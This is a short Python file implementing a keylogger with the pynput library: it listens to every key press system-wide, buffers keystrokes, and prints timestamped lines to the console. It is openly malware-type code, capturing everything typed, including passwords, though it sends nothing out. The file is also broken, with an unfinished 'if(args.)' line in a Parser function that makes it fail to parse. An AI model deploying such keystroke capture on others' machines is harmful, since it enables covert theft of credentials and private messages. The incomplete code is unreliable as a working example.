from pynput import keyboard
import pynput
from sys import argv
from time import gmtime, strftime
# https://github.com/moses-palmer/pynput/issues/20


class logger:

    def __init__(self):

        # WORK AS STACK -> BACKSPACE = POP
        self.__buffer = []
        self.__listener = None

    def __print_formated(self):
        exact_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
        print(exact_time + " " + ''.join(self.__buffer))
        self.__buffer = []


    def run(self):
        with keyboard.Listener(on_press=self.on_press) as self.__listener:
            self.__listener.join()


    def __write_to_buffer(self, key):
        if(key == pynput.keyboard.Key.enter):
            self.__buffer.append("\n")
            self.__print_formated()
        elif(key == pynput.keyboard.Key.backspace):
            try:
                self.__buffer.pop()
            except IndexError:
                pass
        else:
            if(key == pynput.keyboard.Key.space):
                self.__buffer.append(" ")
            elif(hasattr(key, 'char')):
                self.__buffer.append(str(key).replace("'", ""))
            else:
                self.__buffer.append(" " + str(key).replace("'", "").replace("Key.", "") + " ")
        
        # Stop keylogger
        # if(CONDITION):
        #     self.stop()

    def on_press(self, key):
        self.__write_to_buffer(key)

    def stop(self):
        self.__listener.close()


def Parser(args):
    if(args.)

if __name__ == "__main__":
    l = logger()
    l.run()
